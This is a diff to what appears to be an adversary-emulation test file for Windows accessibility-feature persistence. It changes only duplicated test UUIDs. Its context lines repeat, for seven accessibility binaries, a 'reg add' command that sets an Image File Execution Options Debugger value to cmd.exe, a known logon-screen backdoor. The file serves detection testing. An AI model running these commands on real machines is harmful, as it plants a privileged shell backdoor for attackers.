@@ -4,7 +4,7 @@ display_name: Accessibility Features
 
 atomic_tests:
 - name: Attaches Command Prompt As Debugger To Process - osk
-  uuid: 34c8131b-4707-48ee-b55c-41245b91ca0d
+  uuid: d636fbd3-8af1-409f-ba20-10d8baeae12b
 
   description: |
     This allows adversaries to execute the attached process
@@ -23,7 +23,7 @@ atomic_tests:
       reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 
 - name: Attaches Command Prompt As Debugger To Process - sethc
-  uuid: 34c8131b-4707-48ee-b55c-41245b91ca0d
+  uuid: adfbed73-6765-4dee-a3af-70c4cea63537
 
   description: |
     This allows adversaries to execute the attached process
@@ -42,7 +42,7 @@ atomic_tests:
       reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 
 - name: Attaches Command Prompt As Debugger To Process - utilman
-  uuid: 34c8131b-4707-48ee-b55c-41245b91ca0d
+  uuid: 306a241f-59b8-49a2-baaa-ffd6a4d6951f
 
   description: |
     This allows adversaries to execute the attached process
@@ -61,7 +61,7 @@ atomic_tests:
       reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 
 - name: Attaches Command Prompt As Debugger To Process - magnify
-  uuid: 34c8131b-4707-48ee-b55c-41245b91ca0d
+  uuid: 9bcbe8f4-cd5a-4320-a0b1-f717bb9cf03f
 
   description: |
     This allows adversaries to execute the attached process
@@ -80,7 +80,7 @@ atomic_tests:
       reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 
 - name: Attaches Command Prompt As Debugger To Process - narrator
-  uuid: 34c8131b-4707-48ee-b55c-41245b91ca0d
+  uuid: 1a4a404d-bc7f-4f53-9de8-12c6f3360b7a
 
   description: |
     This allows adversaries to execute the attached process
@@ -99,7 +99,7 @@ atomic_tests:
       reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 
 - name: Attaches Command Prompt As Debugger To Process - DisplaySwitch
-  uuid: 34c8131b-4707-48ee-b55c-41245b91ca0d
+  uuid: 37a8939d-243c-45ad-9d8a-0f8992e16545
 
   description: |
     This allows adversaries to execute the attached process
@@ -118,7 +118,7 @@ atomic_tests:
       reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 
 - name: Attaches Command Prompt As Debugger To Process - AtBroker
-  uuid: 34c8131b-4707-48ee-b55c-41245b91ca0d
+  uuid: 2ea9942f-b418-45a2-b790-0a780cbd321c
 
   description: |
     This allows adversaries to execute the attached process
